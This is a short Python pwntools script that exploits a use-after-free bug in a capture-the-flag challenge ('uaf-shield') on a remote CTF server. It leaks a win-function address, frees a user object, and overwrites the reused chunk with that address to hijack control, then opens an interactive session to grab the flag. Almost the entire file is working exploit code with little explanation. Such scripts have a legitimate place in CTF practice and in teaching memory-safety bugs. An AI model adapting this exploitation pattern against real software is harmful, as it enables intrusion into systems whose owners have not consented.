from pwn import *


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x8048d6f
break *0x8048aff
break *0x8048a61
continue
'''.format(**locals())

context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = remote('uaf-shield.ctf.bsidestlv.com', 31337)

# Create user (not needed, just for demo)
io.sendlineafter(b'(e)xit', b'M')
io.sendlineafter(b':', b'crypto')

# Leak memory (win address)
io.sendlineafter(b'(e)xit', b'S')
io.recvuntil(b'OOP! Memory leak...', drop=True)
leak = int(io.recvlineS(), 16)
log.info(f"leaked hahaexploitgobrrr() address: {hex(leak)}")

# Free the user
io.sendlineafter(b'(e)xit', b'I')
io.sendlineafter(b'?', b'Y')

# Leave a message (leaked address)
# The freed chunk will be reused
io.sendlineafter(b'(e)xit', b'L')
io.sendafter(b':', p64(leak))

# Got Flag?
io.interactive()
#warn(io.recvlines(2)[1].decode())